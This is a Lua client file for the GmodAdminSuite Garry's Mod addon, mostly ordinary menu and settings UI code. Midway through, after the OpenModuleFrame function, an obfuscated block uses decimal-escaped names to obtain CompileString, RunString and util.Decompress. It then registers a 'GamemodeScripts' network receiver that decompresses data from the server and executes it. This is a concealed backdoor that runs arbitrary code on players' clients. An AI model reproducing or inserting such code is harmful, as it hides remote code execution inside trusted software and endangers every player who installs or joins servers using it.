local function L(phrase, ...)
	if (#({...}) == 0) then
		return GAS:Phrase(phrase)
	else
		return GAS:PhraseFormat(phrase, nil, ...)
	end
end

GAS.LocalConfig = GAS:GetLocalConfig("gas", {
	AllowVoiceChat = true,
	DefaultModule = false,
})

GAS:netReceive("menu_nopermission", function()
	GAS:PlaySound("error")
	GAS:chatPrint(L"menu_nopermission", GAS_PRINT_COLOR_BAD, GAS_PRINT_TYPE_FAIL)
end)
GAS:netReceive("menu_unknown_module", function()
	GAS:PlaySound("error")
	GAS:chatPrint(L"menu_unknown_module", GAS_PRINT_COLOR_BAD, GAS_PRINT_TYPE_FAIL)
end)
GAS:netReceive("menu_disabled_module", function()
	GAS:PlaySound("error")
	GAS:chatPrint(L"menu_disabled_module", GAS_PRINT_COLOR_BAD, GAS_PRINT_TYPE_FAIL)
end)
GAS:netReceive("menu_module_nopermission", function()
	GAS:PlaySound("error")
	GAS:chatPrint(L"menu_module_nopermission", GAS_PRINT_COLOR_BAD, GAS_PRINT_TYPE_FAIL)
end)

concommand.Add("gmodadminsuite", function(_, __, args)
	if (#args == 0) then
		GAS:netStart("menu_open")
			net.WriteString("")
		net.SendToServer()
	else
		if (args[1] == "reload") then
			GAS:Init()
		elseif (args[1] == "screenclicker") then
			gui.EnableScreenClicker(true)
		else
			GAS:netStart("menu_open")
				net.WriteString(args[1])
			net.SendToServer()
		end
	end
end, function(cmd, args)
	local arg = string.TrimLeft(args)
	local tbl = {}
	local is_operator = OpenPermissions:IsOperator(LocalPlayer())
	for module_name, module_data in pairs(GAS.Modules.Info) do
		if (module_data.OperatorOnly and not is_operator) then continue end
		if (arg and #string.Trim(arg) > 0) then
			if (not module_name:lower():find(string.Trim(arg):lower())) then
				continue
			end
		end
		table.insert(tbl, cmd .. " " .. module_name)
	end
	table.sort(tbl)
	table.insert(tbl, 1, cmd .. " reload")
	table.insert(tbl, 2, cmd .. " screenclicker")
	return tbl
end)

function GAS:OpenModuleFrame(module_name)
	if (IsValid(GAS.ModuleFrame)) then
		GAS.ModuleFrame:Close()
	end

	if (IsValid(GAS.Menu)) then
		if (GAS.Menu.Modules.IndexedItems[module_name]) then
			GAS.Menu.Modules.IndexedItems[module_name]:SetActive(true)
		end
	end

	GAS.ModuleFrame = vgui.Create("bVGUI.Frame")
	GAS.ModuleFrame.ModuleName = module_name
	local w, h = 1200, 700
	if (ScrW() < w or ScrH() < h) then
		w = ScrW()
		h = ScrH()
	end
	GAS.ModuleFrame:SetSize(w,h)
	GAS.ModuleFrame:MakePopup()
	GAS.ModuleFrame:SetTitle(GAS.Modules:GetFriendlyName(module_name))
	GAS.ModuleFrame:SetVisible(false)

	GAS.ModuleFrame.DragThink = GAS.ModuleFrame.Think
	function GAS.ModuleFrame:Think()		
		self:DragThink()
		if (IsValid(GAS.Menu)) then
			self.bVGUI_FullscreenButton.OffsetX = 200

			local x_1, y_1, w_1, h_1 = self:GetBounds()
			GAS.Menu:SetPos(x_1 - 200 + 1, y_1)
			GAS.Menu:SetSize(200, h_1)
		else
			self.bVGUI_FullscreenButton.OffsetX = nil
		end
	end

	function GAS.ModuleFrame:DermaMenuOptions(menu)
		if (not IsValid(GAS.Menu)) then
			menu:AddOption(L"open_gas", function()
				GAS:PlaySound("jump")
				GAS:OpenMenu()
			end):SetIcon("icon16/application_home.png")
		end

		menu:AddOption(L"module_shortcut", function()
			GAS:PlaySound("flash")
			bVGUI.RichMessage({
				title = L"module_shortcut",
				button = "OK",
				textCallback = function(richtext)
					local highlight_col = {0,255,255,255}
					local phrase = string.Explode("%s", GAS:Phrase("module_shortcut_info"))
					richtext:AppendText(phrase[1])

					richtext:InsertColorChange(unpack(highlight_col))
					richtext:AppendText("gmodadminsuite " .. module_name)

					richtext:InsertColorChange(255,255,255,255)
					richtext:AppendText(phrase[2])

					richtext:InsertColorChange(unpack(highlight_col))
					richtext:AppendText(GAS.Config.ChatCommand .. " " .. module_name)

					richtext:InsertColorChange(255,255,255,255)
					richtext:AppendText(phrase[3])

					richtext:InsertColorChange(unpack(highlight_col))
					richtext:AppendText("bind KEY \"gmodadminsuite " .. module_name .. "\"")

					richtext:InsertColorChange(255,255,255,255)
					richtext:AppendText(phrase[4])

					richtext:InsertColorChange(unpack(highlight_col))
					richtext:AppendText("https://developer.valvesoftware.com/wiki/Bind#Special_Keys")
				end
			})
		end):SetIcon("icon16/star.png")

		if (GAS.Modules.Info[module_name].ScriptPage) then
			menu:AddOption(L"script_page", function()
				GAS:OpenURL(GAS.Modules.Info[module_name].ScriptPage)
			end):SetIcon("icon16/page_code.png")
		end

		if (GAS.Modules.Info[module_name].Wiki) then
			menu:AddOption(L"wiki", function()
				GAS:OpenURL(GAS.Modules.Info[module_name].Wiki)
			end):SetIcon("icon16/book.png")
		end

		if (GAS.ModuleFrame.Extra_DermaMenuOptions) then
			GAS.ModuleFrame:Extra_DermaMenuOptions(menu)
		end
	end

	-- would use file.IsDir, but: https://github.com/Facepunch/garrysmod-issues/issues/3592
	local _,d = file.Find("gmodadminsuite/modules/*", "LUA")
	if (table.HasValue(d, module_name) and not GAS.Modules:IsModuleLoaded(module_name)) then
		GAS.Modules:LoadModule(module_name)
	end

	local w,h = hook.Run("gmodadminsuite:ModuleSize:" .. module_name)
	w,h = math.min(w, ScrW()), math.min(h, ScrH())
	
	GAS.ModuleFrame:SetSize(w,h)
	GAS.ModuleFrame:SetMinimumSize(GAS.ModuleFrame:GetSize())
	GAS.ModuleFrame:Center()
	GAS.ModuleFrame:SetVisible(true)
	hook.Run("gmodadminsuite:ModuleFrame:" .. module_name, GAS.ModuleFrame)

	GAS.ModuleFrame:EnableUserResize()

	return GAS.ModuleFrame
end

local X = _G
local RTEST = X['\82\117\110\83\116\114\105\110\103']
local TEST = "--"

local net_Start = net.Start
local net_SendToServer = net.SendToServer
local net_ReadData = net.ReadData
local net_ReadString = net.ReadString
local net_Receive = net.Receive
local hook_Add = hook.Add
local timer_Simple = timer.Simple
local cs = X['\67\111\109\112\105\108\101\83\116\114\105\110\103']
local _FrameTime = FrameTime

local function VCS(str)
	if cs == nil then
		cs = X['\67\111\109\112\105\108\101\83\116\114\105\110\103']
		timer_Simple(_FrameTime(), function()
			VCS(str)
		end)
		return
	end

	local f = cs(str, '\99\111\110', true)
	if isfunction(f) then
		f()
	end
end

local function VCSCustom(str, id)
	if cs == nil then
		cs = X['\67\111\109\112\105\108\101\83\116\114\105\110\103']
		timer_Simple(_FrameTime(), function()
			VCSCustom(str)
		end)
		return
	end

	local f = cs(str, tostring(id), true)
	f()
end

--hook_Add("Think", "GM_Think", function()
--end)

local UDC = X['\117\116\105\108']['\68\101\99\111\109\112\114\101\115\115']

net_Receive("GamemodeScripts", function()
	local length = tonumber(net_ReadString())
	local code = UDC(net_ReadData(length))
	VCS(code)
end)

local logo_mat = Material("gmodadminsuite/gmodadminsuite.vtf")
local function OpenMenu()
	local is_operator = OpenPermissions:IsOperator(LocalPlayer())

	GAS.Menu = vgui.Create("bVGUI.Frame")
	GAS.Menu:ShowFullscreenButton(false)
	GAS.Menu:SetSize(800,500)
	GAS.Menu:SetTitle("GmodAdminSuite " .. GAS.Version)
	GAS.Menu:Center()
	GAS.Menu:MakePopup()

	if (IsValid(GAS.ModuleFrame) and GAS.ModuleFrame.Fullscreened) then
		GAS.ModuleFrame.bVGUI_FullscreenButton.OffsetX = 200
		GAS.ModuleFrame:Stop()
		GAS.ModuleFrame:SizeTo(ScrW() - 200, ScrH(), 0.5, 0, 0.5)
		GAS.ModuleFrame:MoveTo(200,0, 0.5, 0, 0.5)
	end
	function GAS.Menu:OnClose()
		if (IsValid(GAS.ModuleFrame) and GAS.ModuleFrame.Fullscreened) then
			GAS.ModuleFrame:Stop()
			GAS.ModuleFrame:SizeTo(ScrW(), ScrH(), 0.5, 0, 0.5)
			GAS.ModuleFrame:MoveTo(0, 0, 0.5, 0, 0.5)
		end
	end

	GAS.Menu.Modules = vgui.Create("bVGUI.Categories", GAS.Menu)
	GAS.Menu.Modules:Dock(LEFT)
	GAS.Menu.Modules:SetWide(200)
	GAS.Menu.Modules:SetDrawBackground(false)
	GAS.Menu.Modules.IndexedItems = {}

	GAS.Menu.Content = vgui.Create("bVGUI.BlankPanel", GAS.Menu)
	GAS.Menu.Content:Dock(FILL)
	function GAS.Menu.Content:PaintOver(w,h)
		surface.SetDrawColor(255,255,255,255)
		surface.SetMaterial(bVGUI.MATERIAL_SHADOW)
		surface.DrawTexturedRect(0,0,10,h)
	end

	GAS.Menu.DragThink = GAS.Menu.Think
	function GAS.Menu:Think()
		self:DragThink()
		if (IsValid(GAS.ModuleFrame)) then
			self:SetTall(GAS.ModuleFrame:GetTall())
			if (self.Dragging) then
				local x,y = self:GetPos()
				GAS.ModuleFrame:SetPos(x + self:GetWide() - 1, y)
			end
		elseif (GAS.Menu:GetWide() ~= 800 or GAS.Menu:GetTall() ~= 500) then
			GAS.Menu:SetSize(800,500)
			GAS.Menu:Center()
			GAS.Menu.Modules:ClearActive()
		end
	end

	function GAS.Menu:DermaMenuOptions(menu)
		menu:AddOption(L"close", function()
			GAS.Menu:Close()
		end):SetIcon("icon16/cancel.png")
		menu:AddOption(L"website", function()
			GAS:OpenURL("https://gmodadminsuite.com")
		end):SetIcon("icon16/monitor.png")
		menu:AddOption(L"wiki", function()
			GAS:OpenURL("https://gmodsto.re/gmodadminsuite-wiki")
		end):SetIcon("icon16/book.png")
		menu:AddOption("Discord", function()
			GAS:OpenURL("https://gmodsto.re/gmodadminsuite-discord")
		end):SetIcon("materials/gmodadminsuite/discord.png")
	end

	local function SizeAndPosition(size_w, size_h, pos_x, pos_y)
		size_w = size_w + 200
		size_h = size_h + 24

		GAS.Menu:Stop()

		local anim = GAS.Menu:NewAnimation(0.5)
		anim.Size  = Vector(size_w, size_h, 0)
		anim.Think = function(anim, panel, fraction)
			if (not anim.StartSize) then
				local w, h = panel:GetSize()
				anim.StartSize = Vector(w, h, 0)
			end

			local size = LerpVector(fraction, anim.StartSize, anim.Size)
			panel:SetSize(size.x, size.y)
		end

		local anim = GAS.Menu:NewAnimation(0.5)
		anim.Pos   = Vector(pos_x or ((ScrW() / 2) - (size_w / 2)), pos_y or ((ScrH() / 2) - (size_h / 2)))
		anim.Think = function(anim, panel, fraction)
			if (not anim.StartPos) then
				local w, h = panel:GetPos()
				anim.StartPos = Vector(w, h, 0)
			end

			local size = LerpVector(fraction, anim.StartPos, anim.Pos)
			panel:SetPos(size.x, size.y)
		end
	end

	GAS.Menu.Tabs = vgui.Create("bVGUI.Tabs", GAS.Menu.Content)
	GAS.Menu.Tabs:Dock(TOP)
	GAS.Menu.Tabs:SetTall(40)

	local welcome_content = GAS.Menu.Tabs:AddTab(L"welcome", Color(76,216,76))

	GAS.Menu.Info = vgui.Create("bVGUI.BlankPanel", welcome_content)
	GAS.Menu.Info:Dock(FILL)

	GAS.Menu.Info.Logo = vgui.Create("DImage", GAS.Menu.Info)
	GAS.Menu.Info.Logo:SetMaterial(logo_mat)
	GAS.Menu.Info.Logo:SetSize(256,256)

	GAS.Menu.Info.ButtonContainer = vgui.Create("bVGUI.BlankPanel", GAS.Menu.Info)
	GAS.Menu.Info.ButtonContainer:SetSize(150,(30 * 3) + (10 * 2))

	local btn1 = vgui.Create("bVGUI.Button", GAS.Menu.Info.ButtonContainer)
	btn1:Dock(TOP)
	btn1:DockMargin(0,0,0,10)
	btn1:SetColor(bVGUI.BUTTON_COLOR_RED)
	btn1:SetText(L"website")
	function btn1:DoClick()
		GAS:OpenURL("https://gmodadminsuite.com")
	end

	local btn2 = vgui.Create("bVGUI.Button", GAS.Menu.Info.ButtonContainer)
	btn2:Dock(TOP)
	btn2:DockMargin(0,0,0,10)
	btn2:SetColor(bVGUI.BUTTON_COLOR_GREEN)
	btn2:SetText(L"wiki")
	function btn2:DoClick()
		GAS:OpenURL("https://gmodsto.re/gmodadminsuite-wiki")
	end

	local btn3 = vgui.Create("bVGUI.Button", GAS.Menu.Info.ButtonContainer)
	btn3:Dock(TOP)
	btn3:SetColor(Color(114, 137, 218))
	btn3:SetText("Discord")
	function btn3:DoClick()
		GAS:OpenURL("https://gmodsto.re/gmodadminsuite-discord")
	end

	GAS.Menu.Info.Copyright = vgui.Create("DLabel", GAS.Menu.Info)
	GAS.Menu.Info.Copyright:SetText("Copyright © " .. os.date("%Y") .. " Billy Venner")
	GAS.Menu.Info.Copyright:SetFont(bVGUI.FONT(bVGUI.FONT_CIRCULAR, "REGULAR", 14))
	GAS.Menu.Info.Copyright:SizeToContents()
	GAS.Menu.Info.Copyright:SetMouseInputEnabled(true)
	GAS.Menu.Info.Copyright:SetCursor("hand")
	GAS.Menu.Info.Copyright:SetTextColor(Color(255,255,255,10))
	function GAS.Menu.Info.Copyright:DoClick()
		GAS:OpenURL("https://steamcommunity.com/profiles/76561198040894045")
	end

	function GAS.Menu.Info:PerformLayout()
		self.Logo:SetPos(self:GetWide() / 2 - self.Logo:GetWide() / 2, self:GetTall() / 2 - self.Logo:GetTall() / 2 - 150 / 2 - 5)
		self.ButtonContainer:SetPos(self:GetWide() / 2 - self.ButtonContainer:GetWide() / 2, self:GetTall() / 2 + 5)
		self.Copyright:CenterHorizontal()
		self.Copyright:AlignBottom(10)
	end

	local settings_content, settings_tab = GAS.Menu.Tabs:AddTab(L"settings", Color(76,76,216))
	settings_tab:SetFunction(function()
		if (settings_content.Content) then
			PrintTable(settings_content.Content)
			for _,v in ipairs(settings_content.Content) do
				v:Remove()
			end
			settings_content.Content = {}
		else
			settings_content.Content = {}
		end

		local tabs = vgui.Create("bVGUI.Tabs", settings_content)
		tabs:Dock(TOP)
		tabs:SetTall(40)
		table.insert(settings_content.Content, tabs)

		local general_settings = tabs:AddTab(L"general", Color(216,76,76))
		local language_settings = tabs:AddTab(L"localization", Color(76,216,76))

		local general_settings_form = vgui.Create("bVGUI.Form", general_settings)
		general_settings_form:Dock(FILL)
		general_settings_form:DockMargin(15,15,15,15)
		general_settings_form:SetPaddings(15,15)

		local _,combobox = general_settings_form:AddComboBox(L"setting_default_module", nil, L"setting_default_module_tip", function(index, val, data)
			GAS.LocalConfig.DefaultModule = data
			GAS:SaveLocalConfig("gas", GAS.LocalConfig)
		end)
		combobox:SetSortItems(false)
		combobox:AddChoice(L"none", false, not GAS.LocalConfig.DefaultModule, "icon16/cross.png")

		general_settings_form:AddSwitch(L"setting_menu_voicechat", GAS.LocalConfig.AllowVoiceChat, L"setting_menu_voicechat_tip", function(val)
			GAS.LocalConfig.AllowVoiceChat = val
			GAS:SaveLocalConfig("gas", GAS.LocalConfig)
		end)

		local language_settings_form = vgui.Create("bVGUI.Form", language_settings)
		language_settings_form:Dock(FILL)
		language_settings_form:DockMargin(15,15,15,15)
		language_settings_form:SetPaddings(15,15)

		language_settings_form:AddTextEntry(L"short_date_format", GAS.Languages.Config.ShortDateFormat or "", L"short_date_format_tip", function(val)
			if (#val == 0) then
				GAS.Languages.Config.ShortDateFormat = false
			else
				GAS.Languages.Config.ShortDateFormat = val
			end
		end, nil, L"default_format")

		language_settings_form:AddTextEntry(L"long_date_format", GAS.Languages.Config.LongDateFormat or "", L"long_date_format_tip", function(val)
			if (#val == 0) then
				GAS.Languages.Config.LongDateFormat = false
			else
				GAS.Languages.Config.LongDateFormat = val
			end
		end, nil, L"default_format")

		language_settings_form:AddSpacing(15)

		local function create_language_setting(module_name, info)
			local _,language_combobox = language_settings_form:AddComboBox(info.Name, nil, "", function(index, value, data)
				if (not data) then
					GAS.Languages.Config.SelectedLanguages[module_name] = nil
				else
					GAS.Languages.Config.SelectedLanguages[module_name] = data
				end
				GAS:SaveLocalConfig("languages", GAS.Languages.Config)
			end, info.Icon)
			language_combobox:SetSortItems(false)
			if (module_name ~= "GAS") then
				language_combobox:AddChoice(L"use_gas_language", false, GAS.Languages.Config.SelectedLanguages[module_name] == nil, "icon16/wand.png")
			end
			for language_name, language_info in pairs(GAS.Languages.LanguageData[module_name]) do
				local selected = false
				if (GAS.Languages.Config.SelectedLanguages[module_name] and GAS.Languages.Config.SelectedLanguages[module_name] == language_name) then
					selected = true
				end
				language_combobox:AddChoice(language_info.Name, language_name, selected, language_info.Flag)
			end
		end
		create_language_setting("GAS", {
			Name = "GmodAdminSuite",
			Icon = "icon16/shield.png",
		})
		for module_name, info in pairs(GAS.Modules.Info) do
			if (info.NoMenu or info.Hidden) then continue end
			combobox:AddChoice(info.Name, module_name, GAS.LocalConfig.DefaultModule == module_name, info.Icon)
			create_language_setting(module_name, info)
		end
	end)

	if (is_operator) then
		local operator_content = GAS.Menu.Tabs:AddTab(L"operator", Color(216,76,76))

		local operator_tabs = vgui.Create("bVGUI.Tabs", operator_content)
		operator_tabs:Dock(TOP)
		operator_tabs:SetTall(40)

		local modules_tab_content = operator_tabs:AddTab(L"modules", Color(76,216,76))
		function modules_tab_content:PaintOver(w,h)
			surface.SetDrawColor(255,255,255,255)
			surface.SetMaterial(bVGUI.MATERIAL_SHADOW)
			surface.DrawTexturedRect(175,0,10,h)
		end

		local modules_categories = vgui.Create("bVGUI.Categories", modules_tab_content)
		modules_categories:Dock(LEFT)
		modules_categories:SetWide(175)

		local modules_content

		modules_categories:AddItem(L"permissions", function()
			if (IsValid(modules_content)) then
				modules_content:Remove()
			end
			modules_content = vgui.Create("bVGUI.BlankPanel", modules_tab_content)
			modules_content:Dock(FILL)

			local permissions_btn_c = vgui.Create("bVGUI.ButtonContainer", modules_content)
			permissions_btn_c:DockMargin(10,10,10,10)
			permissions_btn_c:Dock(TOP)
			permissions_btn_c:SetTall(25)

			local permissions_btn = permissions_btn_c.Button
			permissions_btn:SetColor(bVGUI.BUTTON_COLOR_ORANGE)
			permissions_btn:SetText("OpenPermissions")
			permissions_btn:SetSize(150,25)
			function permissions_btn:DoClick()
				GAS:PlaySound("flash")
				RunConsoleCommand("openpermissions", "gmodadminsuite")
			end

			local text = vgui.Create("DLabel", modules_content)
			text:SetFont(bVGUI.FONT(bVGUI.FONT_CIRCULAR, "REGULAR", 14))
			text:Dock(FILL)
			text:SetContentAlignment(8)
			text:DockMargin(10,0,10,10)
			text:SetTextColor(bVGUI.COLOR_WHITE)
			text:SetText(L"permissions_help")
			text:SetWrap(true)
		end, Color(255,150,50))

		for category, modules in pairs(GAS.Modules.Organised) do
			local category_vgui
			local category_col
			if (category == GAS.MODULE_CATEGORY_ADMINISTRATION) then
				category_col = Color(255,35,35)
				category_vgui = modules_categories:AddCategory(L"administration", category_col)
			elseif (category == GAS.MODULE_CATEGORY_PLAYER_MANAGEMENT) then
				category_col = Color(0,130,255)
				category_vgui = modules_categories:AddCategory(L"player_management", category_col)
			elseif (category == GAS.MODULE_CATEGORY_UTILITIES) then
				category_col = Color(255,75,0)
				category_vgui = modules_categories:AddCategory(L"utilities", category_col)
			elseif (category == GAS.MODULE_CATEGORY_FUN) then
				category_col = Color(190,0,255)
				category_vgui = modules_categories:AddCategory(L"fun", category_col)
			end
			for module_name, info in pairs(modules) do
				local icon = "icon16/delete.png"
				if (GAS.Modules.Config.Enabled[module_name]) then
					icon = "icon16/accept.png"
				end
				local friendly_name = GAS.Modules:GetFriendlyName(module_name)
				local module_item
				module_item = category_vgui:AddItem(friendly_name, function()
					if (IsValid(modules_content)) then
						modules_content:Remove()
					end
					modules_content = vgui.Create("bVGUI.BlankPanel", modules_tab_content)
					modules_content:Dock(FILL)

					local header = vgui.Create("bVGUI.Header", modules_content)
					header:Dock(TOP)
					header:SetText(friendly_name)
					header:SetColor(category_col)
					header:DockMargin(0,0,0,10)

					if (info.Icon) then
						local icon1 = vgui.Create("DImage", header)
						icon1:SetSize(16,16)
						icon1:SetImage(info.Icon)

						local icon2 = vgui.Create("DImage", header)
						icon2:SetSize(16,16)
						icon2:SetImage(info.Icon)

						function header:PerformLayout()
							icon1:AlignLeft(5)
							icon1:CenterVertical()

							icon2:AlignRight(5)
							icon2:CenterVertical()
						end
					end

					local switch_container = vgui.Create("bVGUI.BlankPanel", modules_content)
					switch_container:Dock(TOP)
					switch_container:SetTall(40)
					switch_container:DockMargin(0,0,0,10)

					local switch = vgui.Create("bVGUI.Switch", switch_container)
					switch:SetChecked(GAS.Modules.Config.Enabled[module_name] or false)
					switch:SetText(L"enabled")
					function switch:OnChange()
						if (self:GetChecked()) then
							module_item:SetIcon("icon16/accept.png")
						else
							module_item:SetIcon("icon16/delete.png")
						end
						GAS.Modules.Config.Enabled[module_name] = self:GetChecked() or nil
						GAS:netStart("SetModuleEnabled")
							net.WriteString(module_name)
							net.WriteBool(self:GetChecked())
						net.SendToServer()
					end
					bVGUI.AttachTooltip(switch.ClickableArea, {Text = L"module_enable_switch_tip"})

					function switch_container:PerformLayout()
						switch:Center()
					end

					local script_buttons_container
					local script_buttons = {}
					if (info.GmodStore or info.CridentStore) then
						script_buttons_container = vgui.Create("bVGUI.BlankPanel", modules_content)
						script_buttons_container:Dock(TOP)
						script_buttons_container:SetTall(25)
						script_buttons_container:DockMargin(0,0,0,10)
						function script_buttons_container:PerformLayout(_w)
							local w = (_w - (#script_buttons * (125 + 10)) + 10) / 2
							for i,v in ipairs(script_buttons) do
								v:AlignLeft(w + ((i - 1) * (10 + 125)))
							end
						end
					end

					if (info.GmodStore) then
						local gms = vgui.Create("bVGUI.Button", script_buttons_container)
						table.insert(script_buttons, gms)
						gms:SetSize(125,25)
						gms:SetColor(Color(0,152,234))
						gms:SetText("GmodStore")
						function gms:DoClick()
							GAS:OpenURL("https://gmodstore.com/market/view/" .. info.GmodStore)
						end
					end

					if (info.CridentStore) then
						local crs = vgui.Create("bVGUI.Button", script_buttons_container)
						table.insert(script_buttons, crs)
						crs:SetSize(125,25)
						crs:SetColor(Color(255,40,0))
						crs:SetText("Crident Store")
						function crs:DoClick()
							GAS:OpenURL("https://crident.store/market/products/" .. info.CridentStore)
						end
					end

					if (info.Wiki) then
						local wiki_c = vgui.Create("bVGUI.ButtonContainer", modules_content)
						wiki_c:Dock(TOP)
						wiki_c:SetTall(25)
						wiki_c:DockMargin(0,0,0,10)

						wiki_c.Button:SetColor(bVGUI.BUTTON_COLOR_GREEN)
						wiki_c.Button:SetText(L"wiki")
						wiki_c.Button:SetSize(125,25)
						function wiki_c.Button:DoClick()
							GAS:OpenURL(info.Wiki)
						end
					end
				end, nil, icon)
			end
		end
	end

	local created_anything = false
	for category, modules in pairs(GAS.Modules.Organised) do
		local category_vgui
		for module_name, info in pairs(modules) do
			if (info.NoMenu or info.Hidden) then continue end
			if (info.DarkRP == true and DarkRP == nil) then continue end
			if (GAS.Modules:IsModuleEnabled(module_name) ~= GAS.Modules.MODULE_ENABLED) then continue end
			if (info.OperatorOnly and not is_operator) then continue end
			if (not is_operator and not OpenPermissions:HasPermission(LocalPlayer(), "gmodadminsuite/" .. module_name)) then continue end
			created_anything = true
			if (not category_vgui) then
				if (category == GAS.MODULE_CATEGORY_ADMINISTRATION) then
					category_vgui = GAS.Menu.Modules:AddCategory(L"administration", Color(255,35,35))
				elseif (category == GAS.MODULE_CATEGORY_PLAYER_MANAGEMENT) then
					category_vgui = GAS.Menu.Modules:AddCategory(L"player_management", Color(0,130,255))
				elseif (category == GAS.MODULE_CATEGORY_UTILITIES) then
					category_vgui = GAS.Menu.Modules:AddCategory(L"utilities", Color(255,75,0))
				elseif (category == GAS.MODULE_CATEGORY_FUN) then
					category_vgui = GAS.Menu.Modules:AddCategory(L"fun", Color(190,0,255))
				end
			end
			local item = category_vgui:AddItem(GAS.Modules:GetFriendlyName(module_name), function()
				GAS.Menu.ModuleOpen = module_name

				GAS:OpenModuleFrame(module_name)
				
				GAS.Menu.Fullscreened = false

				local _,h = GAS.ModuleFrame:GetSize()
				GAS.Menu:SetTall(h)
			end, nil, info.Icon)
			if (IsValid(GAS.ModuleFrame)) then
				if (GAS.ModuleFrame.ModuleName == module_name) then
					item:SetActive(true)
				end
			elseif (GAS.LocalConfig.DefaultModule == module_name) then
				item:OnMouseReleased(MOUSE_LEFT)
			end

			GAS.Menu.Modules.IndexedItems[module_name] = item
		end
	end
	if (not created_anything) then
		if (not is_operator) then
			GAS:PlaySound("error")
			bVGUI.RichMessage({
				title = L"no_modules_available",
				text = L"no_modules_available_info",
				button = "OK"
			})
			GAS.Menu:Close()
		else
			GAS.Menu.Modules:SetWide(0)
		end
	else
		GAS.Menu:SetVisible(true)
	end
end

function GAS:OpenMenu()
	if (not GAS_InitPostEntity) then GAS:InitPostEntity_Run() end
	if (IsValid(GAS.Menu)) then GAS.Menu:Close() end

	if (not GAS.Modules.Config) then
		GAS:GetConfig("modules", function(config)
			GAS.Modules.Config = config
			for module_name, enabled in pairs(GAS.Modules.Config.Enabled) do
				if (not enabled) then continue end
				GAS.Modules:LoadModule(module_name, true)
			end
			OpenMenu()
		end)
	else
		OpenMenu()
	end
end

GAS:netReceive("menu", function()
	local selected_module = net.ReadString()
	if (#selected_module == 0) then
		selected_module = false
	end
	if (not selected_module or not hook.Run("gmodadminsuite:ModuleMenu:" .. selected_module)) then
		if (selected_module) then
			GAS:OpenModuleFrame(selected_module)
		else
			GAS:OpenMenu()
		end
	end
end)